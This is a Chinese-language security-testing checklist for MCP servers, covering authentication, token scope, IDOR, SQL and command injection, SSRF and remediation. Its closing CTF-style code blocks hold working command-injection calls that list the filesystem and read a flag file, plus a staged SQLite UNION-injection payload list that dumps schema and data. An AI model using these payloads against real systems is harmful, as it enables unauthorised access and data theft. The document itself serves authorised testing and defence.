---
id: coae-appsec-8a07e467
title: 'MCP Server 常见漏洞安全测试清单'
aliases: []
domain:
  - 'AI应用与系统安全'
note_type:
  - checklist
attack_phase:
  - inference
  - agent
status: draft
tags:
  - coae
  - ai-security
updated: 2026-08-12
---
# MCP Server 常见漏洞安全测试清单

> 适用范围：本地或远程 MCP Server 的 Resources、Resource Templates、Tools、认证授权、下游 API 和错误处理的授权安全评估。仅测试自有系统、隔离靶场或书面授权目标；默认使用合成账户、canary 数据、无害命令 marker 和自有 HTTP 接收器，不读取真实秘密、不扫描内网、不修改生产数据。
>
> 基础前置：[MCP 基础架构与安全测试清单](../AI与LLM基础/MCP基础架构与安全测试清单.md)

## 0. 核心判断

```text
MCP Server 是独立的软件与网络服务
  -> 不是只能由 LLM 访问
  -> 不能把 LLM 的拒绝、过滤或“韧性”当作安全边界
  -> 任何能连接 Server 的主体都可能直接构造 JSON-RPC 请求

正确安全边界
  = Transport 认证
  + Token Audience 与 Scope
  + Tool/Resource 级授权
  + 对象级与租户级授权
  + 严格参数/URI 校验
  + 安全的下游实现
  + 最小权限和完整审计
```

完整数据流：

```text
用户 / 自动化客户端 / 恶意客户端
  -> MCP Transport 与 JSON-RPC
  -> Resource 或 Tool Handler
  -> 下游数据库 / Shell / 文件 / HTTP API / SaaS
  -> MCP Result / Error / Log
```

每一层都可能产生独立漏洞：

| 层 | 常见问题 | 主要证据 |
|---|---|---|
| Transport | 无认证、Origin 缺失、会话混淆 | 未授权主体建立有效会话 |
| Discovery | 过度枚举、描述泄密 | `*/list` 暴露内部能力或对象 |
| Resource | IDOR、路径穿越、SQL 注入 | 越权读取或 canary 被返回 |
| Tool | 命令注入、SSRF、越权副作用 | marker 执行、回连或状态变化 |
| Error/Log | Token、API Key、路径、请求头泄露 | 错误或日志返回合成秘密 |
| Downstream | 共享高权身份、Token 透传 | 不同用户以同一高权身份访问 |

## 0.1 进入目标后的 5 分钟路线

### 第 1 分钟：确认 Server 边界

```text
[ ] 记录 Server URL、版本、Transport 和运行位置
[ ] 记录认证方式、Token Audience、Scope 和租户
[ ] 确认是否可以绕过 Host 直接连接 Server
[ ] 标记 Server 连接的数据库、文件系统、Shell 和外部 API
```

### 第 2 分钟：只枚举不执行

```text
[ ] `resources/list`
[ ] `resources/templates/list`
[ ] `tools/list`
[ ] 记录名称、描述、URI Template、Schema 和注解
[ ] 标记日志、管理、执行命令、任意 URL 和写入类能力
```

### 第 3 分钟：建立正常基线

```text
[ ] 读取自己的固定合成 Resource
[ ] 使用合法参数调用只读 Tool
[ ] 记录正常 Result、Error、状态码、耗时和日志
[ ] 记录实际下游身份与请求范围
```

### 第 4 分钟：低影响异常输入

```text
[ ] 不存在的测试对象 ID
[ ] 缺失、额外、错类型和超长参数
[ ] 单个引号、分隔符或 URL 编码差异
[ ] 指向自有接收器的测试 URL
[ ] 仅观察合成 canary 和无害 marker
```

### 第 5 分钟：确定阻断位置

```text
[ ] Client 是否阻断？
[ ] MCP Server 是否鉴权或校验？
[ ] 下游 API 是否再次授权？
[ ] 危险输入是否到达数据库、Shell 或 HTTP Client？
[ ] Error、Result 和 Log 是否泄露额外信息？
```

## 1. 测试变量与安全数据

### Linux / macOS

```bash
export MCP_URL="http://127.0.0.1:8000/mcp"
export MCPV_MARKER="SYNTHETIC_MCPV_$(date +%Y%m%d_%H%M%S)"
export CALLBACK_URL="http://127.0.0.1:9000/mcpv-callback"
```

### Windows PowerShell

```powershell
$McpUrl = "http://127.0.0.1:8000/mcp"
$McpvMarker = "SYNTHETIC_MCPV_$(Get-Date -Format yyyyMMdd_HHmmss)"
$CallbackUrl = "http://127.0.0.1:9000/mcpv-callback"
```

前置清单：

```text
[ ] 准备用户 A、用户 B、管理员和未认证四种测试身份
[ ] 每个账户只使用虚构文档、订单、商品和日志
[ ] 在授权测试目录和测试数据库中预置唯一 canary
[ ] 为外部 API 使用 Mock Server 或测试租户
[ ] 回连接收器归测试者所有，且只记录请求元数据
[ ] SQL 测试仅使用错误探针或读取固定常量
[ ] 命令测试仅输出唯一 marker，不读取文件或建立 Shell
[ ] SSRF 不访问 loopback 服务、云元数据、内网或第三方系统
[ ] 所有可写 Tool 使用可回滚测试对象并记录原始状态
[ ] 已设置请求次数、超时、停止条件和清理步骤
```

## 2. Server 能力枚举清单

可以通过授权测试 Client 或 MCP Inspector 获取能力。不得把“Host UI 未显示”当作 Server 没有该能力。

```python
import asyncio
from fastmcp import Client

MCP_URL = "http://127.0.0.1:8000/mcp"

async def main():
    async with Client(MCP_URL) as client:
        print(await client.list_resources())
        print(await client.list_resource_templates())
        print(await client.list_tools())

asyncio.run(main())
```

使用前按实际 SDK 版本核对 API，并在代码中通过安全配置注入 URL 与测试凭据，不要硬编码生产 Token。

枚举记录清单：

```text
[ ] Server 名称、版本、instructions 和 capabilities
[ ] Resource 名称、URI、描述、MIME、大小和注解
[ ] Resource Template 的 URI Template 与全部变量
[ ] Tool 名称、描述、inputSchema、outputSchema 和注解
[ ] Tool 是否读取、写入、删除、发送、购买或执行系统动作
[ ] Tool 是否接收 URL、路径、SQL 条件、命令、模板或对象 ID
[ ] Tool/Resource 使用哪个下游系统和服务身份
[ ] 同一能力对不同用户与 Scope 的可见性差异
[ ] list-changed 后新增能力是否需要重新授权
[ ] 描述与注解是否包含内部路径、主机、凭据或调试信息
```

## 3. Transport、认证与会话测试清单

### 3.1 直接访问假设

```text
[ ] 不通过 LLM Host，使用普通 MCP Client 连接 Server
[ ] 未认证初始化是否得到有效 capabilities？
[ ] 未认证 `resources/list`、`tools/list` 是否返回内容？
[ ] 普通用户是否看到管理员专用能力？
[ ] Server 是否只依赖“Client 一定是可信 LLM 应用”的假设？
[ ] 反向代理与 Server 是否都执行认证？
[ ] 本地 HTTP Server 是否只绑定 loopback 并验证 Origin？
```

### 3.2 Token 与 Scope

当前 MCP HTTP 授权规范将受保护 Server 视为 OAuth Resource Server。

```text
[ ] Server 是否验证签名、发行者、Audience、过期时间和 Not-Before？
[ ] Token 是否明确签发给当前 MCP Server？
[ ] 为其他 API 签发的 Token 是否被拒绝？
[ ] 只读 Scope 能否调用写入或管理 Tool？
[ ] 不同 Resource 与 Tool 是否要求最小 Scope？
[ ] Scope 缺失时是否失败关闭，而非使用默认高权身份？
[ ] Token 撤销、过期或用户权限变化后是否立即失效？
[ ] Token 是否出现在 URL、Result、Error、日志或 Tool 参数中？
```

### 3.3 Token passthrough 与混淆代理

```text
[ ] MCP Server 是否把 Client Token 原样转发给下游 API？
[ ] Server 是否为下游 API 获取独立、正确 Audience 的 Token？
[ ] 下游调用能否关联原始用户、MCP Client 和授权目的？
[ ] 共享静态 API Key 是否让所有 MCP 用户获得相同数据范围？
[ ] 使用静态第三方 Client ID 时是否执行逐 Client 用户同意？
[ ] 用户 A 的下游授权结果是否可能被用户 B 的 Client 复用？
[ ] Server 是否在调用下游前执行本地工具级和对象级授权？
[ ] 审计能否区分 MCP Client、用户和下游服务身份？
```

### 3.4 Session 隔离

```text
[ ] Session ID 是否随机且绑定认证主体、租户和 Client？
[ ] 用户 A 的 Session ID 是否被用户 B 拒绝？
[ ] 退出、撤销或关闭后旧 Session 是否失效？
[ ] 并发 Session 的 Resource、Tool Result 和 SSE 消息是否串线？
[ ] 重连是否重复非幂等 `tools/call`？
[ ] 日志是否只保存 Session 摘要而非完整凭据？
```

## 4. 敏感信息泄露测试清单

### 4.1 Resource 与 Tool Result

```text
[ ] 是否存在 logs、debug、config、env、health 或 status Resource？
[ ] 日志 Resource 是否对普通用户可见？
[ ] Result 是否包含 API Key、Token、Cookie、Authorization 或密码？
[ ] Result 是否包含完整请求头、连接字符串或内部 URL？
[ ] Result 是否返回完成任务不需要的用户、租户或对象字段？
[ ] Tool 失败后是否把下游原始响应完整传给 Client？
[ ] Resource Link 与 Embedded Resource 是否重新鉴权？
[ ] 二进制、图片和附件元数据是否泄露路径或作者信息？
```

### 4.2 安全错误探针

对每个 Resource Template 和 Tool 依次测试：

```text
[ ] 不存在的合成对象名
[ ] 缺失必填参数
[ ] 额外未知参数
[ ] 错误类型：null、数组、对象、数字与字符串互换
[ ] 空字符串、边界长度和超长字符串
[ ] 非法 URI、编码错误和控制字符
[ ] 下游 Mock API 返回受控 400、401、403、404、429 和 500
[ ] 下游连接超时或测试 DNS 失败
```

泄露信号：

```text
堆栈、源码路径、包版本
完整下游 URL 与请求头
API Key、Token、Cookie 或连接字符串
数据库错误、SQL 片段与表名
服务器文件路径、用户名和环境变量
其他用户对象的存在性或属性
```

### 4.3 日志与可观测系统

```text
[ ] 错误对 Client 已脱敏，但 Server 日志是否仍记录秘密？
[ ] APM、Trace、异常平台是否收集完整参数和 Result？
[ ] Tool 参数中的 Token 是否在日志写入前脱敏？
[ ] 不同租户的日志查询权限是否隔离？
[ ] 日志 Resource 是否只返回当前用户允许的最少事件？
[ ] 保留期、导出、备份和删除策略是否覆盖 MCP 日志？
```

## 5. Broken Authorization 测试清单

外部 API 的 Token Scope 可能提供一层保护，但不能假设它自动完成 MCP 用户级授权。若 Server 使用共享高权凭据，所有 Client 可能继承同一广泛权限。

### 5.1 Resource IDOR

以 `document://{doc_id}` 为例，仅使用用户 A 与用户 B 各自创建的合成文档：

```text
[ ] 用户 A 正常读取 A 文档，建立基线
[ ] 用户 B 正常读取 B 文档，建立基线
[ ] 用户 A 请求 B 文档 ID
[ ] 用户 B 请求 A 文档 ID
[ ] 改变大小写、前导零、编码和 ID 类型后复测
[ ] `resources/list` 是否提前泄露其他用户 doc_id？
[ ] 不存在与无权访问对象是否避免可利用的响应差异？
[ ] 缓存是否把 A 的 Resource 返回给 B？
[ ] Resource Template 是否在每次读取时重新鉴权？
```

### 5.2 Tool 级与对象级授权

```text
[ ] 普通用户能否直接调用管理 Tool？
[ ] 只读用户能否调用创建、更新、删除或发送 Tool？
[ ] 用户 A 能否在 Tool 参数中指定用户 B 的对象？
[ ] 模型或 Client 提供的 user_id、role、tenant_id 是否覆盖会话身份？
[ ] Tool 内部的多个下游请求是否分别执行授权？
[ ] 批量 Tool 是否逐个检查对象所有权？
[ ] 同一 Tool 经不同路由、Task 或旧协议入口时策略是否一致？
[ ] 撤销权限后，排队中 Task 是否重新鉴权？
```

### 5.3 Scope 与下游身份矩阵

| 测试身份 | MCP Scope | 可见 Resource | 可用 Tool | 下游身份 | 预期对象范围 |
|---|---|---|---|---|---|
| 未认证 | 无 | 无 | 无 | 无 | 无 |
| 用户 A | 待读取 | 待读取 | 待读取 | 待读取 | 仅 A |
| 用户 B | 待读取 | 待读取 | 待读取 | 待读取 | 仅 B |
| 管理员 | 待读取 | 待读取 | 待读取 | 待读取 | 按业务策略 |

## 6. SQL 注入测试清单

Resource URI 通过 Web API 间接访问数据库时，MCP Server 与下游 API 都必须安全处理。URI Schema 验证通过不等于 SQL 安全。

### 6.1 基线与错误探针

```text
[ ] 使用已知合成商品建立正常价格基线
[ ] 使用不存在商品建立阴性基线
[ ] 参数加入单引号，观察受控错误与下游日志
[ ] 比较原始字符和百分号编码后的处理差异
[ ] 记录 Client、MCP Server、下游 API 各层解码次数
[ ] 不使用真实表名、列名或敏感数据验证
```

### 6.2 只读确认

仅在专用测试数据库中，使用固定常量或测试表 marker 证明输入影响查询结构：

```text
[ ] 使用不会改变数据库状态的布尔差异或固定常量
[ ] 请求次数保持最少，不枚举 Schema 和生产数据
[ ] 记录参数从 Resource URI 到 SQL Driver 的完整流向
[ ] 记录 SQL 是否参数化以及占位符与绑定值
[ ] 成功后立即停止，不继续数据外泄测试
```

### 6.3 编码与规范化

```text
[ ] URI 原始字符与 `%xx` 编码
[ ] 重复编码与混合大小写编码
[ ] `+` 与 `%20` 的空格差异
[ ] Path、Host、Query 和 Template 变量解码差异
[ ] Client SDK、Server 路由与下游框架是否重复解码
[ ] Unicode 引号和规范化差异
[ ] 校验发生在最终解码与规范化之后
```

### 6.4 安全预期

```text
Resource Template 参数
  -> 统一解码与严格业务格式校验
  -> 作为数据传给下游 API
  -> 下游使用参数化 SQL
  -> 错误只返回通用消息与关联 ID
```

## 7. 命令注入测试清单

提供系统命令能力的 Tool 风险极高。优先把“命令字符串”改成固定操作枚举；仅在隔离环境使用无害 marker 验证。

### 7.1 基线

```text
[ ] 枚举允许的业务操作，而非操作系统命令
[ ] 使用固定 `date` 或等价只读测试操作建立基线
[ ] 使用明显不在 allowlist 的普通单词建立拒绝基线
[ ] 记录 Server 最终执行的程序、argv、用户和工作目录
```

### 7.2 无害分隔符探针

在隔离靶场中，用只输出唯一 marker 的命令作为第二段，不读取文件、不联网、不建立 Shell：

```text
[ ] 分号、管道、逻辑与和逻辑或
[ ] 换行、回车和制表符
[ ] 命令替换与反引号
[ ] 引号闭合和转义差异
[ ] Windows 与 POSIX Shell 元字符差异
[ ] URL/JSON 编码后在下游重新解释的差异
```

成功信号：Server 日志或 Tool Result 显示测试 marker 的第二个操作实际执行。仅错误消息变化不能证明命令执行。

### 7.3 实现审计

```text
[ ] 是否调用 Shell 解析完整字符串？
[ ] Allowlist 是否先判断前缀，再把原字符串交给 Shell？
[ ] 是否使用固定可执行文件和独立 argv？
[ ] 是否允许用户控制程序名、选项、工作目录或环境变量？
[ ] 是否存在参数注入，即不经 Shell 也能改变程序语义？
[ ] 运行账户是否为非 root 并使用只读文件系统？
[ ] 是否限制子进程时间、输出、内存、网络和文件访问？
[ ] 错误是否隐藏命令、路径和执行用户详情？
```

## 8. SSRF 测试清单

仅使用自有测试接收器验证任意出站请求，不探测 MCP Server 的 loopback、内网端口、云元数据或第三方地址。

### 8.1 无害回连基线

```text
[ ] 为每次请求生成唯一 callback path
[ ] 记录接收时间、来源 IP、方法、Host 和 User-Agent
[ ] URL 指向测试者控制且不重定向的 HTTP 服务
[ ] 仅发送一次请求，不进行端口或网段扫描
[ ] 确认 Tool Result 与接收器日志使用同一关联 ID
```

收到回连只证明 Server 可以访问该 URL，不等于已经访问内网、窃取数据或获得 RCE。

### 8.2 URL 校验矩阵

全部变体应指向自有接收器或不可路由的测试地址：

```text
[ ] HTTP 与 HTTPS 协议 allowlist
[ ] 用户信息、大小写、尾点和默认端口
[ ] IPv4、IPv6 和不同合法文本表示
[ ] DNS 解析前后地址一致性
[ ] 单次和多次安全重定向
[ ] 编码、重复编码和 URL 解析器差异
[ ] 非预期 Scheme：file、ftp、gopher 等应拒绝
[ ] 响应大小、时间、Content-Type 和重定向次数限制
[ ] 下载内容不会在验证前被解析或执行
```

### 8.3 安全实现

```text
[ ] 业务允许时使用固定上游，不接受任意 URL
[ ] 必须可配时采用协议、主机、端口和路径 allowlist
[ ] DNS 解析后拒绝私网、loopback、链路本地和保留地址
[ ] 每次重定向重新解析和校验最终目标
[ ] 通过受控出站代理与网络策略限制连接范围
[ ] 不向目标转发 Client Authorization、Cookie 或内部 Header
[ ] 限制响应大小、读取时间和 MIME 类型
[ ] 日志记录规范化 URL 摘要、最终地址和阻断原因
```

## 9. 其他 MCP Server 实现风险清单

```text
[ ] 文件 Resource：路径穿越、符号链接逃逸、UNC 与绝对路径
[ ] URL Resource：开放重定向、SSRF 和凭据转发
[ ] 模板 Tool：服务端模板注入与输出编码
[ ] 数据转换 Tool：不安全反序列化、归档解压和 XML 外部实体
[ ] Git Tool：参数注入、Hook 执行和跨仓库权限
[ ] Browser Tool：认证会话滥用、任意导航和下载执行
[ ] 数据库 Tool：SQL/NoSQL 注入、批量查询和超量返回
[ ] 文件写入 Tool：路径逃逸、覆盖、竞态和权限继承
[ ] 消息 Tool：收件人替换、内容注入和未确认发送
[ ] Task：可猜 ID、跨用户查询、取消失效和重复副作用
[ ] Resource/Tool Result：间接提示词注入和后续 Tool 诱导
[ ] Tool annotations：伪造 readOnly/destructive 提示误导 Host
```

## 10. 快速测试用例表

| 编号 | 测试目标 | 无害操作 | 漏洞信号 |
|---|---|---|---|
| MCPV-01 | 直接访问 | 绕过 Host 连接测试 Server | 未认证获得有效会话 |
| MCPV-02 | 能力枚举 | 执行三个 `*/list` | 返回无权使用的管理能力 |
| MCPV-03 | Token Audience | 使用签发给测试 API 的 Token | MCP Server 错误接受 |
| MCPV-04 | Scope | 只读 Token 调用测试写 Tool | 越权调用成功 |
| MCPV-05 | Token 透传 | 检查 Mock 下游请求头 | Client Token 被原样转发 |
| MCPV-06 | Session 隔离 | 用户 B 复用用户 A Session | 访问被接受 |
| MCPV-07 | 日志 Resource | 普通账户读取测试日志 | 返回超范围事件或秘密 |
| MCPV-08 | 错误泄露 | 触发不存在合成对象 | 返回 Token、Header、路径或栈 |
| MCPV-09 | 下游错误 | Mock API 返回受控 500 | 原始内部响应完整外泄 |
| MCPV-10 | Resource IDOR | A 请求 B 的合成文档 | 跨用户读取成功 |
| MCPV-11 | Tool IDOR | A 操作 B 的测试对象 | 越权副作用发生 |
| MCPV-12 | 角色自述 | 参数中声明管理员角色 | 服务端权限被改变 |
| MCPV-13 | SQL 错误探针 | 测试字段加入单引号 | 返回 SQL 特征错误 |
| MCPV-14 | SQL 只读确认 | 专用库返回固定 marker | 输入改变查询结构 |
| MCPV-15 | URI 解码 | 使用编码后的安全探针 | 绕过上游格式校验 |
| MCPV-16 | 命令 allowlist | 调用不在列表的普通值 | 仍进入执行器 |
| MCPV-17 | 命令分隔符 | 第二段只输出 marker | marker 实际执行 |
| MCPV-18 | 命令权限 | 检查测试进程身份 | 以 root 或高权身份运行 |
| MCPV-19 | SSRF 回连 | 请求自有 callback URL | Server 可访问任意 URL |
| MCPV-20 | SSRF 重定向 | 自有接收器安全重定向 | 最终目标未重新校验 |
| MCPV-21 | Resource 注入 | 返回无害指令 marker | Host 自动触发额外 Tool |
| MCPV-22 | Tool Result 注入 | Tool 返回无害指令 marker | 结果被当作授权指令 |
| MCPV-23 | 输出 Schema | Mock Tool 返回错类型 | Server/Client 未验证结果 |
| MCPV-24 | 超量输出 | 返回边界大小测试内容 | 无大小、时间或内存限制 |
| MCPV-25 | Task 所有权 | A 查询 B 的测试 Task | 状态或结果跨用户泄露 |
| MCPV-26 | 修复回归 | 重放全部 MCPV 用例 | 任一漏洞仍可稳定复现 |

## 11. 单次测试记录模板

> 通用字段、证据要求和安全约束见：[AI 安全测试通用记录模板](../_模板/测试记录-通用.md)。下方保留本主题的专用字段。

```text
测试编号：
时间 / 关联 ID：
授权范围：
目标 Server / 版本：
Transport / URL：
协议版本：

测试账户 / 租户：
Token Audience / Scope：
Session ID 摘要：
是否绕过 Host 直接连接：

能力类型：Resource / Resource Template / Tool / Task
名称 / URI：
Description / Schema / Annotation：
下游系统：
下游服务身份：

正常基线：
无害测试输入 / marker：
编码与规范化过程：
服务端参数校验：
工具级授权：
对象级授权：
下游请求 / 查询 / argv 摘要：

MCP Result：
MCP Error：
Server Log：
下游 Mock Log：
是否泄露秘密或内部信息：
是否读取跨用户 canary：
是否执行第二个命令 marker：
是否产生 HTTP 回连：
是否产生副作用：

截图 / 日志位置：
对象恢复与清理：
最终判定：未触发 / 信息泄露 / 被阻断 / 漏洞已验证
```

## 12. 根因审计清单

```text
[ ] 是否假设所有 MCP Client 都由可信 LLM Host 控制？
[ ] 是否把模型拒绝或 Host UI 隐藏当作 Server 安全控制？
[ ] HTTP Server 是否缺少认证、Origin 或 Session 隔离？
[ ] 是否接受错误 Audience、过期或 Scope 不足的 Token？
[ ] 是否把 Client Token 原样透传给下游 API？
[ ] 是否使用共享高权 API Key，却缺少用户级对象授权？
[ ] `*/list` 是否枚举无权访问的能力、对象或内部实现？
[ ] Resource URI 和 Tool 参数是否在最终解码前校验？
[ ] 是否依赖字符串黑名单而非严格 Schema 和 allowlist？
[ ] SQL 是否通过字符串拼接构造？
[ ] 命令 allowlist 后是否仍把原始字符串交给 Shell？
[ ] URL 是否缺少解析后地址、重定向和出站网络检查？
[ ] 下游异常是否将完整请求、Header 和凭据返回 Client？
[ ] Server 日志是否记录完整 Token、参数和敏感 Result？
[ ] Resource、Tool Result 和 Annotation 是否被 Host 当作可信指令？
[ ] Tool 是否以 root、全盘文件权限或不受限网络运行？
[ ] 多租户缓存、Task 和连接池是否缺少身份绑定？
[ ] 是否没有针对 URI 编码和多层解码的回归测试？
```

## 13. 修复与回归清单

### 13.1 身份与授权

```text
[ ] 所有远程连接实施认证并验证 Token Audience
[ ] Resource、Tool 和对象访问使用最小 Scope
[ ] 禁止 Token passthrough；下游使用独立正确 Audience 的凭据
[ ] 共享服务凭据之外仍执行用户级和租户级授权
[ ] Session、缓存和 Task 绑定用户、Client 与租户
[ ] 高影响 Tool 执行前获得绑定最终参数的用户确认
```

### 13.2 输入与下游实现

```text
[ ] Resource URI 在统一解码规范化后执行严格格式和边界检查
[ ] Tool inputSchema 拒绝未知字段、错类型和歧义转换
[ ] 数据库使用参数化查询
[ ] 系统操作使用固定程序和 argv，不调用 Shell
[ ] HTTP 访问采用严格 allowlist、地址校验、重定向复检和出站策略
[ ] 文件使用真实根目录检查并防止符号链接逃逸
[ ] 解析器、模板和输出 Sink 使用对应安全 API
```

### 13.3 输出、错误与最小权限

```text
[ ] Result 只返回完成任务所需字段并验证 outputSchema
[ ] Error 返回通用消息和关联 ID，不返回秘密和内部请求
[ ] Token、Header、参数和 Result 在所有日志平台脱敏
[ ] Tool Result、Resource 与 Annotation 始终按不可信内容处理
[ ] Server 和 Tool 使用非 root、只读文件系统与受限出站网络
[ ] 设置调用次数、超时、结果大小、成本和资源上限
[ ] 写操作具备幂等、撤销、补偿和完整审计
```

### 13.4 修复后复测顺序

```text
1. 未认证主体不能初始化受保护 MCP 会话或枚举能力
2. 错误 Audience、Scope、过期和撤销 Token 全部拒绝
3. Client Token 不再透传，下游身份与原始用户可关联
4. 普通用户只看到并调用自身权限内 Resource 和 Tool
5. 用户 A 无法读取或操作用户 B 的任何测试对象
6. 所有错误输入均返回脱敏结果，日志也不保存秘密
7. SQL 探针被参数化查询作为普通数据处理
8. 命令分隔符 marker 无法触发第二个操作
9. 任意 URL 与重定向变体被校验或网络策略阻断
10. Resource 与 Tool Result 中的指令不能授权后续调用
11. Session、缓存和 Task 不发生跨用户串线
12. 重放 MCPV-01～MCPV-26，确认所有路径稳定阻断
```

## 14. 最终判定口径

```text
安全：直接 MCP Client 与 LLM Host 走同一认证授权；Resource、Tool 和下游系统均严格校验、最小授权、脱敏并可审计。

中风险：存在能力或内部信息暴露，但未授权访问、注入和副作用在下游执行前稳定阻断。

高风险：可跨用户读取 canary、影响 SQL 结构、执行命令 marker、访问任意测试 URL，或泄露测试 Token/API Key。

严重：可读取真实敏感数据、执行任意系统命令、访问云元数据或关键内网、接管下游账户，或以共享高权身份产生不可逆副作用。达到该证据后立即停止扩大验证。
```

## 15. 官方规范参考

- [MCP 2025-11-25 Authorization](https://modelcontextprotocol.io/specification/2025-11-25/basic/authorization)
- [MCP Security Best Practices](https://modelcontextprotocol.io/docs/tutorials/security/security_best_practices)
- [MCP 2025-11-25 Tools](https://modelcontextprotocol.io/specification/2025-11-25/server/tools)
- [MCP 2025-11-25 Resources](https://modelcontextprotocol.io/specification/2025-11-25/server/resources)
- [MCP 2025-11-25 Transports](https://modelcontextprotocol.io/specification/2025-11-25/basic/transports)

## 16. 可复用考试代码块：MCP Client 基础模板

用途：任意 MCP Server 题目先枚举 Resources、Resource Templates、Tools，再按暴露面调用。

```bash
pip3 install fastmcp
```

```python
import asyncio
from fastmcp import Client, FastMCP

MCP_URL = "http://STMIP:STMPO/mcp/"
client = Client(MCP_URL)

async def discover():
    resources = await client.list_resources()
    templates = await client.list_resource_templates()
    tools = await client.list_tools()

    print("Resources")
    for r in resources:
        print(r.name, "-", r.description.strip())

    print("\nResource Templates")
    for t in templates:
        print(t.uriTemplate, "-", t.description.strip())

    print("\nTools")
    for t in tools:
        params = list(t.inputSchema.get("properties", {}).keys())
        print(f"{t.name}({', '.join(params)}) - {t.description.strip()}")

async def read(uri):
    result = await client.read_resource(uri)
    print(result[0].text)

async def call(tool, args):
    result = await client.call_tool(tool, args)
    print(result.content[0].text)

async def main():
    async with client:
        await discover()
        # await read("resource://logs")
        # await read("price://banana")
        # await call("execute_server_command", {"command": "date"})

asyncio.run(main())
```

## 17. 可复用考试代码块：MCP 信息泄露、命令注入、SQLite 注入

日志泄露：

```python
async with client:
    try:
        await read("quantity://banana")
    except Exception as e:
        print(f"[-] {e}")
    await read("resource://logs")
```

命令注入探测：

```python
async with client:
    await call("execute_server_command", {"command": "date"})
    await call("execute_server_command", {"command": "date | ls /"})
    await call("execute_server_command", {"command": "date | cat /flag.txt"})
```

SQLite Resource URI 注入：

```python
payloads = [
    "price://banana'",
    "price://x'%20UNION%20SELECT%201--",
    "price://x'%20UNION%20SELECT%20sqlite_version%28%29--",
    "price://x'UNION%20SELECT%20group_concat%28name%29%20FROM%20sqlite_master--",
    "price://x'UNION%20SELECT%20group_concat%28name%20%7C%7C%20%27%3A%27%20%7C%7C%20type%29%20FROM%20pragma_table_info%28%27flag%27%29--",
    "price://x'%20UNION%20SELECT%20flag%20FROM%20flag--",
]

async with client:
    for uri in payloads:
        print(uri)
        try:
            await read(uri)
        except Exception as e:
            print(f"[-] {e}")
```

核心技术点：

```text
[ ] read_resource 返回 result[0].text
[ ] call_tool 返回 result.content[0].text
[ ] URI 模板注入需要 URL 编码空格、括号、管道、引号等字符
[ ] Tool 参数注入通常直接传原始字符串
[ ] 日志类 Resource 可能泄露 Authorization、内部 URL、异常栈和 flag
```

一句话总结：**MCP Server 必须按公开可达 API 对待：不要信任 Client、LLM、Tool 描述或下游凭据，每次访问都要用真实身份重新授权，并把所有参数和返回值当作不可信数据。**
